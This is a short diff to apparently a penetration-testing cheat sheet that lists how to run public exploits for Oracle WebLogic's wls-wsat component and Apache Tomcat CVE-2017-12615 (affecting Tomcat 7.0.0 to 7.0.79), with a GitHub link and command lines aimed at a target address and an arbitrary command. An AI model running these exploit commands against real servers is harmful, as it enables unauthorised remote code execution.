@@ -47,6 +47,7 @@ python2 weblogic_wls_wsat_exp.py -t 192.168.235.128:7001 -c "command"
 
 # Tomcat
 https://github.com/1337g/CVE-2017-12615
-python2 CVE-2017-12615.py http://targetip:port
 影響範圍 :
 Apache Tomcat 7.0.0 - 7.0.79
+use :
+python2 CVE-2017-12615.py http://targetip:port
